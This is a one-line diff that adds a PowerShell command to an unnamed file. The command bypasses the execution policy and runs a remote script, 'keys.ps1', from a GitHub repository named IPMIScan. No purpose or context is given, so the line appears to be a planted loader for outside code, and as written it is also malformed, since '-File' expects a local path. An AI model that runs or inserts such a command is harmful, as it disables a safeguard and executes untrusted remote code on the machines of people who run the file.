@@ -1,0 +1,1 @@
+﻿powershell -ExecutionPolicy Bypass -File "https://github.com/talesaraujo777/IPMIScan/blob/keys.ps1"
